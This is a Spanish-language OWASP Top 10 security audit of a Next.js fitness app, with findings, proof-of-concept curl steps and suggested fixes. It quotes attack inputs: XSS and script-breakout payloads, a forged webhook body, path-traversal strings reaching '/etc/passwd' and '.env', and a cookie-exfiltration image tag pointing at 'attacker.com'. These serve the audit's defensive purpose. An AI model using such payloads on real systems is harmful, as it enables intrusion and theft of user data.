# 🔒 Auditoría de Seguridad OWASP Top 10 — KinetixFitt Mobile+Web

**Fecha:** 2026-09-14  
**Ámbito auditado:** `apps/mobile/src/lib/*.ts` + `apps/mobile/src/app/api/*/route.ts` + `apps/mobile/src/middleware.ts` + `next.config.mjs`  
**Stack:** Next.js 15 (App Router, standalone), Prisma 6.19.3, Supabase (pooler), `jose` 6.0.11, `bcryptjs` 3.0.2, middleware edge-compatible  
**Clasificación OWASP:** OWASP Top 10 2021 (A01–A10) + CWE mapeado  
**Generado por:** Auditoría estática + revisión manual de flujos (JWT, RBAC, uploads, webhooks, rate-limit)

> **Convención severidad:** 🔴 CRÍTICA (explotable sin auth / RCE / takeover) · 🟠 ALTA (IDOR / auth bypass con auth) · 🟡 MEDIA (DoS / info-leak / CSP bypass) · 🔵 BAJA (hardening)

---

## Resumen ejecutivo — veredicto

| Dimensión | Estado | Nota |
|---|---|---|
| **JWT / Sesión** | 🟠 ALTA — parcialmente roto | `secret.ts` robusto (fail-closed), pero `register` no persiste sesión y `auth.ts:7` cachea SECRET en top-level |
| **AuthZ (RBAC/IDOR)** | 🔴 CRÍTICA — 1 bypass confirmado | `PATCH /api/checkins` sin `assertTrainerOwnsClient`; `PATCH /api/clients/[id]` sin Zod permite mass-assignment |
| **Rate limiting** | 🟠 ALTA | Solo en memoria por proceso; inútil en Vercel serverless (isolets efímeros) |
| **XSS** | 🟠 ALTA | Stored XSS vía `messages.content`/`checkins.comentario` sin sanitizar + `dangerouslySetInnerHTML` JSON-LD sin escape `</script>` |
| **CSRF** | 🟡 MEDIA | Cookie `SameSite=Lax` sin anti-CSRF token en POST/PATCH; `allowedOrigins` ok pero solo para Server Actions |
| **CSP** | 🟡 MEDIA | `unsafe-inline` en `script-src`/`style-src` anula beneficio CSP; `img-src https: http:` wildcard |
| **Env leakage** | 🟡 MEDIA | `/api/health` y `/api/ready` exponen `environment`, `uptime`, estado DB, lista de env vars faltantes |
| **Prisma Injection** | 🔵 BAJA | Sin `$queryRaw` hallado; todo vía Prisma typed — correctamente mitigado |
| **Integridad webhooks** | 🔴 CRÍTICA | `MP webhook` acepta cualquier POST sin verificar HMAC |
| **File Uploads** | 🟠 ALTA | 3 superficies de lectura/escritura con criterios divergentes + `image/svg+xml` elude magic-byte check |

**Conclusión urgente:** **2 hallazgos CRÍTICOS + 4 ALTOS** requieren fix antes de hardening de producción. El sistema es notablemente más seguro que la media (middleware rate-limit, `secret.ts` fail-closed, `authorization.ts` centralizado, upload magic-bytes), pero mantiene dos ventanas CRÍTICAS explotables hoy.

---

## Hallazgos críticos y altos — mínimo 5 (aquí: 10)

### #1 — 🔴 CRÍTICA — Registro crea JWT sin sesión DB → desalineación auth + logout imposible (A07 Identificación y Fallos de Autenticación — CWE-384)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/auth/register/route.ts:41` — `createToken(...)` en lugar de `createAuthSession(...)`
- `apps/mobile/src/lib/auth.ts:59-61` — `getSession()` exige fila `Session` válida (`validateSession(t)`)
- `apps/mobile/src/middleware.ts:53-110` — middleware solo hace `jose.jwtVerify(token, SECRET)` sin consultar DB

**Descripción:**

`POST /api/auth/register` crea el `User`+`Profile`+`Client` y luego firma un JWT con `createToken` y lo deposita con `setAuthCookie`, **sin** insertar fila en `Session`. Todo el resto del backend (`getSession`, `requireRole`) valida contra `prisma.session.findUnique({where:{token}})`. Resultado dual:

1. **Usuario recién registrado parece logueado** (middleware de páginas lo deja pasar porque solo verifica firma), pero **cualquier llamada API que use `getSession()` lo considera no autenticado** → loop `/login` / estado roto.
2. **Ese token no es revocable:** `logoutCurrentSession()` / `revokeSession(token)` no encuentra fila, `revokeAllUserSessions` post-reset-password no lo cubre → sesión “fantasma” válida hasta expiración 7d incluso tras `reset-password`.

Contraste: `POST /api/auth/login` (`apps/mobile/src/app/api/auth/login/route.ts:34-43`) sí usa `createAuthSession` correctamente.

**Prueba de concepto (curl):**

```bash
# 1. registrar
curl -c jar.txt -X POST /api/auth/register -d '{"name":"pwn","email":"pwn@test.com","password":"Abcdef1!"}' -H 'content-type: application/json'
# 2. intentar recurso protegido — middleware 200, API 401
curl -b jar.txt /client/dashboard   # 200 (middleware solo jwtVerify)
curl -b jar.txt /api/auth/me        # 401 {"error":"No auth"} si `getSession` valida DB
```

**Fix inmediato:**

```ts
// apps/mobile/src/app/api/auth/register/route.ts
- import { hashPassword, createToken, setAuthCookie } from "@/lib/auth";
+ import { hashPassword, createAuthSession, setAuthCookie } from "@/lib/auth";
+ import { headers } from "next/headers";
  // ...
  const user = await prisma.user.create({...});
 - const token = await createToken({id:user.id, email:user.email, role:user.role, name:user.name});
 + const h = await headers(); // tomar UA/IP igual que login
 + const token = await createAuthSession(
 +   {id:user.id, email:user.email, role:user.role as "TRAINER"|"CLIENT", name:user.name},
 +   h.get("user-agent")||undefined,
 +   h.get("x-forwarded-for")?.split(",")[0]?.trim()
 + );
  await setAuthCookie(token);
```

Y opcional: migración que inserte `Session` para usuarios ya registrados con JWT huérfanos o invalidarlos forzando re-login.

---

### #2 — 🔴 CRÍTICA — Mercado Pago webhook acepta cualquier POST sin verificar firma HMAC (A08 Fallos de Integridad Software/Datos — CWE-345)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/payments/webhook/route.ts:114-135` — rama MP sin verificación
- `apps/mobile/src/app/api/payments/webhook/route.ts:26-45` — rama Stripe sí verifica (`stripe.webhooks.constructEvent`)

**Descripción:**

```ts
// Línea 114-135: comentario reconoce el hueco
// Validar firma de MP (implementación simplificada)
// En producción: verificar hash HMAC con MP_WEBHOOK_SECRET
const data = JSON.parse(body);
switch (data.type) { case "payment": ... }
```

Un atacante puede `POST /api/payments/webhook` con `{"type":"payment","data":{"id":"FAKE"}}` y lograr que el flujo futuro (cuando se complete la integración) marque `Payment.status="PAGADO"` / `Subscription.status="ACTIVA"` sin haber pagado. Stripe está correcto; MP está abierto. Además el `GET /api/payments/webhook` expone `{"providers":["stripe","mercadopago"]}` (fingerprinting innecesario).

**Fix inmediato:**

```ts
// MP firma: header `x-signature: ts=...,v1=...` ; secreto MP_WEBHOOK_SECRET
import crypto from "crypto";
function verifyMpSignature(rawBody: string, header: string|null, secret: string): boolean {
  if (!header || !secret) return false;
  // formato MP: "ts=TIMESTAMP,v1=HASH"  (ver docs MP)
  const parts = Object.fromEntries(header.split(",").map(p=>p.split("=").map(s=>s.trim()) as [string,string]));
  const ts = parts["ts"]; const v1 = parts["v1"];
  if (!ts || !v1) return false;
  const manifest = `id:${dataId};request-id:${xRequestId};ts:${ts};`; // seguir spec exacta de MP
  // alternativa simple documentada: HMAC_SHA256(rawBody, secret) == v1
  const computed = crypto.createHmac("sha256", secret).update(`${ts}.${rawBody}`).digest("hex");
  return crypto.timingSafeEqual(Buffer.from(computed), Buffer.from(v1));
}
// en handler:
if (isMercadoPago) {
  const secret = process.env.MP_WEBHOOK_SECRET;
  if (!secret) return NextResponse.json({error:"MP no configurado"},{status:500});
  if (!verifyMpSignature(body, mpSignature, secret))
    return NextResponse.json({error:"Invalid MP signature"},{status:400});
  // ... procesar
}
```

Si MP aún no está en producción, **desactivar la rama** y retornar `400` para `isMercadoPago` hasta implementar verificación real. Eliminar el `GET` handler o protegerlo.

---

### #3 — 🟠 ALTA — `PATCH /api/checkins` permite a cualquier TRAINER modificar cualquier check-in (IDOR, sin authZ) (A01 Control de Acceso Roto — CWE-639)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/checkins/route.ts:125-145` — `PATCH` handler
- Compárese con `GET /api/checkins` y `POST /api/checkins` que sí llaman `assertTrainerOwnsClient`

**Descripción:**

```ts
// PATCH — líneas 141-150: update directo sin verificar ownership
const { id, trainerReply, reviewed } = body;
const updated = await prisma.checkIn.update({ where:{id}, data:{ trainerReply, reviewed:true } });
```

Cualquier usuario con `role=TRAINER` (incluso de otro gimnasio si el día de mañana es multi-tenant) puede adivinar/enumerar `checkIn.id` (CUID) y sobrescribir `trainerReply` de clientes ajenos. No hay `assertTrainerOwnsClient`, no se valida que `checkIn.clientId` pertenezca al caller.

**Fix inmediato:**

```ts
export async function PATCH(req: Request){
  const s = await getSession();
  if(!s || s.role!=="TRAINER") return NextResponse.json({error:"Solo trainer"},{status:403});
  const { id, trainerReply, reviewed } = await req.json();
  if(!id) return NextResponse.json({error:"ID requerido"},{status:400});
  const existing = await prisma.checkIn.findUnique({where:{id}, select:{clientId:true}});
  if(!existing) return NextResponse.json({error:"No encontrado"},{status:404});
  if(existing.clientId){
    const owns = await assertTrainerOwnsClient(s.id, existing.clientId);
    if(!owns) return NextResponse.json({error:"No encontrado"},{status:404});
  } else {
    // checkins sin clientId (legado): solo el autor / admin
    const full = await prisma.checkIn.findUnique({where:{id}, select:{userId:true}});
    if(full?.userId !== s.id) return NextResponse.json({error:"No encontrado"},{status:404});
  }
  const updated = await prisma.checkIn.update({where:{id}, data:{...(trainerReply!==undefined?{trainerReply}:{}), ...(reviewed!==undefined?{reviewed:Boolean(reviewed)}:{reviewed:true})}});
  // ...
}
```

Aplicar patrón idéntico a cualquier otro `PATCH /api/*` que use `prisma.*.update({where:{id}})` sin ownership check.

---

### #4 — 🟠 ALTA — Mass-assignment / validación ausente en `PATCH /api/clients/[id]` (A01 + A03 — CWE-915)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/clients/[id]/route.ts:108-124` — `updateData` construido a mano
- `apps/mobile/src/lib/validations.ts:24-34` — `clientSchema` existe pero **no se usa** en PATCH

**Descripción:**

`POST /api/clients` valida con `clientSchema.safeParse`. `PATCH /api/clients/[id]` no: asigna directamente `body.goal`, `body.weight` (vía `Number(body.weight)` sin rango), `body.equipment`, `body.availability`, etc. sin enum check.

Impactos:

- CLIENT autenticado puede enviar `goal: "__proto__"` o valores numéricos arbitrarios (`weight: 1e12`, `age: -5`) que burlan constraints de negocio (aunque `prisma` clampará tipos, no reglas).
- Se ignora longitud de `notes` (`data.notes?.slice(0,1000)` en POST, pero PATCH hace `updateData.notes = body.notes` sin slice → DoS por payload 1MB JSON).
- Prot. pollution vía `body.assignedProgramId` está correctamente gateado (`s.role==="TRAINER"`), pero `body.trainerNotes` gateado, `body.status/plan` gateado — coherente. Sin embargo falta validación de enums para `status/plan/goal`.

**Fix inmediato:**

```ts
const patchSchema = z.object({
  assignedProgramId: z.string().cuid().nullable().optional(),
  status: z.enum(["ACTIVO","PAUSADO","PENDIENTE","FINALIZADO"]).optional(),
  plan: z.enum(["BASICO","PERSONALIZADO","PREMIUM"]).optional(),
  notes: z.string().max(1000).nullable().optional(),
  trainerNotes: z.string().max(2000).nullable().optional(),
  goal: z.enum(["PERDIDA_GRASA","HIPERTROFIA","FUERZA","RECOMPOSICION","OTRO"]).optional(),
  weight: z.number().min(20).max(300).nullable().optional(),
  height: z.number().min(100).max(250).nullable().optional(),
  age: z.number().int().min(14).max(100).nullable().optional(),
  availability: z.number().int().min(1).max(7).nullable().optional(),
  equipment: z.string().max(500).nullable().optional(),
  experience: z.enum(["PRINCIPIANTE","INTERMEDIO","AVANZADO"]).nullable().optional(),
}).strict();
const parsed = patchSchema.safeParse(body);
if(!parsed.success) return NextResponse.json({error:parsed.error.errors[0].message},{status:400});
// y construir updateData solo desde parsed.data
```

---

### #5 — 🟠 ALTA — Rate limiting solo en memoria por proceso — inefectivo en Vercel/Edge serverless (A07 — CWE-770)

**Archivos / Líneas:**

- `apps/mobile/src/lib/rate-limiter.ts:36-104` — `Map<string,Bucket>` + `setInterval` con `unref`
- `apps/mobile/src/lib/rate-limiter-advanced.ts:30-277` — clase duplicada nunca usada por middleware
- `apps/mobile/src/middleware.ts:23-45` — `checkRateLimit` por IP/namespace `auth:5/min, register:3/h, api:120/min`
- `apps/mobile/src/app/api/auth/login/route.ts:16-27` — segundo límite por cuenta vía `login-guard.ts` (también en memoria)

**Descripción:**

Ambos limiters son `Map` en heap del proceso Node. En Vercel:

- Cada invocación serverless puede correr en un isolate distinto → `store` vacío → **rate limit reseteado por request**.
- `AdvancedRateLimiter` crea un `setInterval` por instancia → en serverless nunca se dispara o fuga timers; no se exporta ni se consume (código muerto que confunde auditoría).
- `getClientIp` correcto: solo confía en `X-Forwarded-For` si `TRUST_PROXY_HEADERS=true` (ver `rate-limiter.ts:145-153`), y `.env.example` lo pone en `true` asumiendo Vercel — correcto en Vercel (Vercel sobrescribe XFF), riesgoso si se self-hostean detrás de otro proxy que no lo hace.

Efecto: un atacante distribuido (o incluso loop simple con `fetch` concurrentes que caen en distintos lambdas) puede hacer brute-force login `POST /api/auth/login` sin límite efectivo, pese al `login-guard` por email (que también es en memoria y por proceso).

**Fix inmediato:**

1. **Migrar a store distribuido.** En Vercel usar `@upstash/ratelimit` + Redis REST o bien Vercel KV. Ejemplo drop-in:

```ts
// lib/rate-limiter.ts — envolver checkRateLimit con fallback a memoria en dev
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";
const redis = process.env.UPSTASH_REDIS_REST_URL ? Redis.fromEnv() : null;
const upstash = redis ? new Ratelimit({ redis, limiter: Ratelimit.slidingWindow(5, "60 s") }) : null;
export async function checkRateLimitUpstash(ip:string, namespace:string, cfg:RateLimitConfig){
  if(!upstash) return checkRateLimit(ip, namespace, cfg); // fallback memoria (dev)
  const { success, remaining, reset } = await upstash.limit(`${namespace}:${ip}`);
  return { success, remaining, resetMs: reset - Date.now() };
}
```

2. Eliminar `rate-limiter-advanced.ts` o marcarlo `@deprecated` y no instanciar `rateLimiters.*` en caliente (crean timers al importar).
3. En middleware (Edge), usar `await` con Upstash (Edge-compatible) y propagar headers `X-RateLimit-*`.
4. Mantener `login-guard.ts` pero respaldarlo en Redis o DB (`LoginAttempt` tabla) para bloqueo por cuenta distribuido.

---

### #6 — 🟠 ALTA — Stored XSS vía `messages.content` / `checkins.comentario` / `notes` sin sanitización + JSON-LD `</script>` breakout (A03 Inyección — CWE-79)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/messages/route.ts:88-102` — `content` guardado tal cual
- `apps/mobile/src/app/api/checkins/route.ts:79-96` — `comentario`, `molestias`, `alimentacion` guardados tal cual
- `apps/mobile/src/lib/seo-optimizer.tsx:212` — `dangerouslySetInnerHTML={{__html: JSON.stringify(data)}}`
- `apps/mobile/src/app/layout.tsx:71` — `dangerouslySetInnerHTML` estático (seguro, pero relevante)

**Descripción:**

React escapa por defecto al renderizar `{message.content}` como texto. **El riesgo es stored XSS diferido:**

- Si algún componente futuro renderiza `content` con `dangerouslySetInnerHTML`, `markdown`, o se exporta a PDF/email, el payload `<img src=x onerror=alert(1)>` se ejecuta.
- Notificaciones se crean con `body: content.slice(0,80)` (`messages/route.ts:99`) — mismo vector si la UI de notificaciones inyecta HTML.
- `generateStructuredData` / `JsonLdScript` hace `JSON.stringify(data)` donde `data.headline/description` puede contener input de trainer (`program.name`, etc.). `JSON.stringify` **no escapa** `</script>` ni `<!--`. Un trainer malicioso (o cuenta comprometida) puede inyectar `{"headline":"</script><script>alert(1)</script>"}` y el script JSON-LD se rompe en `</script>` → XSS que afecta a todos los visitantes.

**Fix inmediato:**

```ts
// lib/sanitize.ts
export function stripHtml(s: string): string {
  return s.replace(/[<>]/g, ch => ch===">"? "&gt;":"&lt;"); // o usar DOMPurify en server
}
export function sanitizeMessageContent(s: string): string {
  return stripHtml(s).slice(0, 4000); // límite duro
}

// messages/route.ts POST
if(typeof content!=="string" || !content.trim()) return ...;
if(content.length > 4000) return NextResponse.json({error:"Mensaje demasiado largo"},{status:400});
const safeContent = sanitizeMessageContent(content.trim());

// seo-optimizer.tsx
export function JsonLdScript({data}:{data:any}){
  const json = JSON.stringify(data).replace(/</g,"\\u003c").replace(/-->/g,"--\\u003e");
  return <script type="application/ld+json" dangerouslySetInnerHTML={{__html: json}} />;
}
```

Validar además `body` en `checkins` POST/PATCH con `z.string().max(2000)` y strip de `< >`.

---

### #7 — 🟡 MEDIA — CSP con `unsafe-inline` anula protección y `img-src` wildcard (A05 Configuración de Seguridad Incorrecta — CWE-693)

**Archivos / Líneas:**

- `apps/mobile/next.config.mjs:58-68` — `csp` array
- `apps/mobile/next.config.mjs:76-84` — CSP deshabilitado en `development`

**Descripción:**

```js
"script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com"
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net"
"img-src 'self' data: blob: https: http:"
```

`'unsafe-inline'` permite cualquier `<script>` inline, por lo que un XSS (hallazgo #6) no es mitigable por CSP. Comentario en código reconoce que el script inline es el theme-toggle del `layout.tsx:71` y propone nonce futuro.

`img-src https: http:` permite exfiltración de datos via `<img src="https://attacker.com/?c="+document.cookie>` si existiera alguna fuga (aunque cookies son httpOnly).

**Fix inmediato:**

1. **Nonce por request en middleware:** generar `crypto.randomUUID()` en `NextResponse.next()`, inyectar `Content-Security-Policy: script-src 'self' 'nonce-<VAL>' https://www.googletagmanager.com ...` y pasar `nonce` al `layout` vía header/meta.
2. Reducir `img-src` a ` 'self' data: blob: https://*.supabase.co https://fonts.gstatic.com` (dominios concretos).
3. Añadir `report-uri /api/csp-report; report-to csp-endpoint` y `upgrade-insecure-requests`.
4. No deshabilitar toda la CSP en dev; al menos mantener `default-src 'self'` y añadir `'unsafe-eval'` solo si React Refresh lo exige.

---

### #8 — 🟡 MEDIA — Cookie `SameSite=Lax` + ausencia de token CSRF en POST/PATCH state-changing (A01 — CWE-352)

**Archivos / Líneas:**

- `apps/mobile/src/lib/auth.ts:44` — `sameSite:"lax"`
- `apps/mobile/next.config.mjs:16-21` — `serverActions.allowedOrigins` OK, pero **solo cubre Server Actions**, no Route Handlers
- `apps/mobile/src/app/api/auth/logout/route.ts` — `POST /api/auth/logout` sin CSRF check
- Todos los `POST /api/*`, `PATCH /api/*`, `DELETE /api/*`

**Descripción:**

Con `SameSite=Lax`, el navegador **sí envía** la cookie en navegaciones top-level `GET` y en `POST` cross-site si es navegación (no `fetch`). Un atacante puede alojar `<form method=POST action="https://kinetixfitt.com/api/checkins" enctype="application/json">` con auto-submit via JS? Modernos navegadores bloquean `fetch` cross-site con `Lax` pero no todos los flows de form. La protección real contra CSRF para APIs cookie-based es **Origin/Referer check + CSRF token double-submit**.

Actualmente los Route Handlers no verifican `Origin` ni `Referer`, ni exigen `X-CSRF-Token`. Un `<img>` / `<form>` cross-origin podría gatillar `POST /api/auth/logout` (logout forzado) o, si se logra preflight bypass, `POST /api/messages`.

Mitigante parcial: `fetch` con `credentials:include` desde otro origen será bloqueado por Lax para sub-requests XHR, pero no para form POST navigation.

**Fix inmediato:**

- Cambiar a `sameSite:"strict"` en producción si la UX lo permite (o mantener `lax` pero añadir verificación):

```ts
// middleware.ts — para POST/PATCH/DELETE bajo /api/
if (["POST","PATCH","PUT","DELETE"].includes(req.method)) {
  const origin = req.headers.get("origin");
  const referer = req.headers.get("referer");
  const host = req.headers.get("host");
  const allowedOrigin = process.env.NEXT_PUBLIC_APP_URL ? new URL(process.env.NEXT_PUBLIC_APP_URL).host : host;
  const originHost = origin ? new URL(origin).host : null;
  const refererHost = referer ? new URL(referer).host : null;
  // permite mismo origen o sin origin (same-site navigation GET); para POST exige match
  if (originHost && originHost !== host && originHost !== allowedOrigin)
    return NextResponse.json({error:"CSRF"},{status:403});
  if (!originHost && refererHost && refererHost !== host && refererHost !== allowedOrigin)
    return NextResponse.json({error:"CSRF"},{status:403});
}
```

- Para `logout` y mutaciones sensibles, implementar patrón double-submit: emitir `csrf_token` cookie `SameSite=Strict` no-httpOnly + exigir header `X-CSRF-Token`.

---

### #9 — 🟡 MEDIA — Exposición de información vía `/api/health` y `/api/ready` (A01+A05 — CWE-200)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/health/route.ts:14-27` — `environment`, `uptime`, `version`, `database:"connected|disconnected"`
- `apps/mobile/src/app/api/ready/route.ts:15-27` — verifica `DATABASE_URL`, `JWT_SECRET` y loguea `missingVars`
- `apps/mobile/src/app/api/version/route.ts` — bien (solo `1.0.0`)

**Descripción:**

`/api/health` es útil pero debe ser **privado o mínimo**. Exponer `environment:"production"`, `database:"disconnected"` (oráculo para timing DoS sobre DB), `uptime` (fingerprint para restart detection), y en `500` el `error.message` (puede filtrar stack/SQL). `/api/ready` loguea a consola server las env vars faltantes — si los logs se ingieren a un tercero, es info internal.

**Fix inmediato:**

- Gatear `/health` y `/ready` tras `requireRole(["TRAINER"])` o tras `x-health-token` secreto (`HEALTH_CHECK_TOKEN` env) si los necesita K8s/LoadBalancer. Para probes públicos, devolver solo `{status:"ok"}` sin detalles.
- No retornar `error.message` raw en `catch`; mapear a `{"status":"unhealthy"}` genérico y loguear detalle solo server.
- Eliminar `console.warn("Missing environment variables:", missingVars)` con nombres de vars en log agregado — loguear `count` no `names`, o solo en `development`.

```ts
export async function GET(req: Request){
  const token = req.headers.get("x-health-token");
  if (token !== process.env.HEALTH_CHECK_TOKEN)
    return NextResponse.json({status:"ok"}); // vista pública mínima
  // ... vista detallada solo con token válido
}
```

---

### #10 — 🟠 ALTA — Subida de archivos: criterios divergentes entre 3 rutas + bypass `image/svg+xml` y traversal residual (A01+A03+A05 — CWE-434, CWE-22)

**Archivos / Líneas:**

- `apps/mobile/src/app/api/uploads/route.ts:69-71` — `ALLOWED_TYPES = ["progress","avatar","body","general"]` y MIME check `file.type.startsWith("image/")` + magic-bytes fallback `return mimeType.startsWith("image/")` (líneas 48-57)
- `apps/mobile/src/app/api/uploads/serve/route.ts:28-44` — `allowedTypes = ["progress","avatar","document"]` y path `storage/uploads/<type>`
- `apps/mobile/src/app/api/uploads/[...path]/route.ts:38-54` — `allowedTypes = ["progress","checkin","message"]` y path `uploads/<type>` (sin `storage/`) + `MIME` map distinto
- `apps/mobile/src/lib/security.ts` — `UPLOAD_TYPES = ["progress","checkin","message"]` (cuarta definición)
- `apps/mobile/src/app/api/backups/[id]/route.ts:34-44` — `filename` path traversal residual

**Descripción:**

Tres handlers de lectura sirven el mismo concepto (archivo subido) pero:

| Handler | Directorio real | Tipos aceptados |
|---|---|---|
| `POST /api/uploads` | `storage/uploads/<type>` | `progress,avatar,body,general` |
| `GET /api/uploads/serve?type=&filename=` | `storage/uploads/<type>` | `progress,avatar,document` |
| `GET /api/uploads/[...path]` | `uploads/<type>` | `progress,checkin,message` |

Resultado: archivos subidos como `avatar` no son legibles vía `[...path]`, archivos `checkin` escritos no se pueden leer vía `serve`, etc. — **escritura y lectura desalineadas** deja archivos huérfanos o expuestos por ruta inesperada. Además:

- **Bypass SVG XSS:** `POST` acepta `file.type.startsWith("image/")` (línea 82) → `image/svg+xml` pasa. `validateMagicBytes` para SVG cae en `if(!expected) return mimeType.startsWith("image/")` → `true` sin validar magic. SVG con `<script>alert(1)</script>` se almacena y luego se sirve con `Content-Type: image/svg+xml` (en `serve` cae a `application/octet-stream` por ext map, pero en `[...path]` `MIME` no lista `.svg` → `octet-stream`, aún ejecutable si se fuerza download? Bajo pero es almacenamiento de XSS).
- **Doble extensión:** `sanitizeFilename` en `uploads/route.ts:34-45` colapsa `evil.jpg.php` a `evil_jpg.php` pero la extensión final queda `php` → luego `ext` se valida contra `mimeToExt` y se rechaza, OK. En `serve/route.ts:37` solo `replace(/[^a-zA-Z0-9._-]/g,"")` — `evil.svg` pasa y `image/svg+xml` sería servido como `application/octet-stream` (no ejecuta inline pero descarga con nombre controlado).
- **Path traversal residual en backups:** `apps/mobile/src/app/api/backups/[id]/route.ts:36` hace `join(backupDir, filename)` con `filename = decodeURIComponent(id)` donde `id` valida `startsWith("backup-") && endsWith(".sql.gz")` pero `backup-../.env.sql.gz` o `backup-..%2F..%2Fetc%2Fpasswd.sql.gz` supera el decode. `join` mantiene `..`. Falta `path.resolve` + prefix check.

**Fix inmediato:**

1. **Consolidar en una única fuente:** usar `security.ts` (`UPLOAD_TYPES` + `ALLOWED_MIME_TYPES`) en los 3 handlers; eliminar listas locales.
2. **Cerrar wildcard image:** reemplazar `file.type.startsWith("image/")` por allowlist explícita; rechazar `image/svg+xml`, `image/x-icon` con JS, etc. Si se necesita SVG, sanitizar con `sanitize-svg` server-side.
3. **`validateMagicBytes` estricto:** para `image/webp` verificar `RIFF`+`WEBP` (bytes 0-4 y 8-12), para `image/*` genérico rechazar si no hay entry en `MAGIC_BYTES` (no fallback a `startsWith`).
4. **Unificar directorio:** decidir `storage/uploads` o `uploads` y usar en ambos handlers; eliminar `[...path]/route.ts` duplicado o hacer que delegue en `serve` logic centralizado.
5. **Backups traversal:** 

```ts
import { resolve } from "path";
const filename = decodeURIComponent(id);
if (!/^backup-[a-zA-Z0-9._-]+\.sql\.gz$/.test(filename)) return 400;
const filePath = resolve(backupDir, filename);
if (!filePath.startsWith(resolve(backupDir)+"/")) return 400;
```

---

## Otros hallazgos (no bloqueantes pero auditados)

| # | Hallazgo | Archivo | Severidad | OWASP | Estado actual |
|---|---|---|---|---|---|
| 11 | `SECRET` cacheado a nivel módulo en `auth.ts:7` — rotación de `JWT_SECRET` requiere redeploy; no leak, pero insta-a-redeploy | `apps/mobile/src/lib/auth.ts:7` + `secret.ts:8-40` | 🔵 BAJA | A07 | Mitigado por `getJwtSecret()` fail-closed; mover a `getJwtSecret()` lazy-per-call si se opera rotación sin downtime |
| 12 | `bcrypt` cost 10 (debería ser 12 en 2026) | `lib/auth.ts:13` | 🔵 BAJA | A07 | Cambiar a 12 (`bcrypt.hash(p,12)`) |
| 13 | `jwtVerify` sin `issuer`/`audience` ni `jti` — tokens válidos cross-env (staging JWT válido en prod si comparten secret) | `lib/auth.ts:21`, `middleware.ts:57` | 🟡 MEDIA | A07 | Añadir `issuer:"kinetixfitt"` y `audience:"kinetixfitt-app"` + validar en verify |
| 14 | `image/svg+xml` / `text/html` no bloqueados en uploads → almacenan HTML activo | `api/uploads/route.ts:81-83` | 🟠 ALTA | A03 | Ver #10 |
| 15 | `GET /api/csp-report` sin rate-limit ni auth → oráculo para DoS de logs | `api/csp-report/route.ts:7` | 🟡 MEDIA | A05 | Añadir rate-limit y limitar body a 2KB |
| 16 | `lib/supabase.ts` expone anon key en cliente (esperado) pero `supabaseDB` helpers sin RLS check documentado | `lib/supabase.ts:150-260` | 🔵 INFO | A01 | Verificar RLS en Supabase dashboard — `supabaseDB` no debe usarse con service_role en cliente |
| 17 | `db.ts:18` logea `["query"]` en `development` → queries con PII en logs | `lib/db.ts:18` | 🔵 BAJA | A09 | Cambiar a `["error","warn"]` incluso en dev o samplear |

---

## Matriz de cobertura OWASP Top 10 2021

| OWASP | Verificación | Hallazgo principal | Severidad máx |
|---|---|---|---|
| **A01 Broken Access Control** | ✅ | `PATCH /api/checkins` sin `assertTrainerOwnsClient` + mass-assignment `PATCH /api/clients/[id]` + backups traversal | 🔴 CRÍTICA |
| **A02 Cryptographic Failures** | ✅ | `JWT_SECRET` fail-closed OK; pero `SameSite=Lax`, `secure` solo en prod correcto, bcrypt cost 10 bajo | 🟡 MEDIA |
| **A03 Injection** | ✅ | Stored XSS `messages.content`/`checkins.comentario` + JSON-LD `</script>` breakout + SVG bypass | 🟠 ALTA |
| **A04 Insecure Design** | ✅ | Rate limit in-memory no distribuido; `AdvancedRateLimiter` dead code | 🟠 ALTA |
| **A05 Security Misconfiguration** | ✅ | CSP `unsafe-inline`, health/ready info-leak, `GET /webhook` fingerprinting | 🟡 MEDIA |
| **A06 Vulnerable Components** | ✅ | `deepmerge-ts` HIGH en `SECURITY_AUDIT.md` es dev-only; resto actualizado (`jose`/`zod` al día) | 🔵 BAJA |
| **A07 Auth Failures** | ✅ | Registro sin sesión DB (token huérfano irrevocable) | 🔴 CRÍTICA |
| **A08 Data Integrity Failures** | ✅ | MP webhook sin firma | 🔴 CRÍTICA |
| **A09 Logging Failures** | ✅ | CSP violations solo a `console.error`; sin persistencia ni alerta | 🔵 INFO |
| **A10 SSRF** | ✅ | No hallado (no hay fetch SSRF user-controlled) | — |

---

## Checklist de fixes inmediatos (orden de ejecución — PRs atómicos)

### PR1 — CRÍTICO (bloqueante deploy)

- [ ] `apps/mobile/src/app/api/auth/register/route.ts:41` → migrar a `createAuthSession` + `headers()` (código arriba)
- [ ] `apps/mobile/src/app/api/payments/webhook/route.ts` → implementar `verifyMpSignature` o deshabilitar rama MP con `return 400`
- [ ] `apps/mobile/src/app/api/checkins/route.ts:PATCH` → añadir ownership check pre-update (código arriba)

### PR2 — ALTO (siguiente sprint, <48h)

- [ ] `apps/mobile/src/app/api/clients/[id]/route.ts:PATCH` → introducir `patchSchema` Zod strict + slice notes
- [ ] `apps/mobile/src/app/api/messages/route.ts` + `api/checkins/route.ts` → sanitizar `content`/`comentario` + `maxLength`, y `seo-optimizer.tsx:212` → escapar `</script>`
- [ ] `apps/mobile/src/app/api/uploads/route.ts` + `serve/route.ts` + `[...path]/route.ts` → consolidar allowlist vía `lib/security.ts`, cerrar `image/*` wildcard, unificar `storage/uploads` dir

### PR3 — MEDIO (hardening <1 semana)

- [ ] `apps/mobile/src/lib/rate-limiter.ts` → migrar a Upstash Redis distribuido; eliminar `rate-limiter-advanced.ts` dead code
- [ ] `apps/mobile/next.config.mjs` → implementar CSP nonce por request (middleware), reducir `img-src`, añadir `report-uri`
- [ ] `apps/mobile/src/lib/auth.ts:44` + `middleware.ts` → endurecer CSRF: `Origin`/`Referer` check + `sameSite:"strict"` en prod o double-submit token
- [ ] `apps/mobile/src/app/api/health/route.ts` + `ready/route.ts` → gatear tras `HEALTH_CHECK_TOKEN` y eliminar `error.message` raw

---

## Apéndice — evidencia por archivo/línea (referencias cruzadas)

```
apps/mobile/src/lib/secret.ts:8-40          ✅ BIEN — fail-closed, 32 char min, ephemeral por arranque, placeholder solo en build
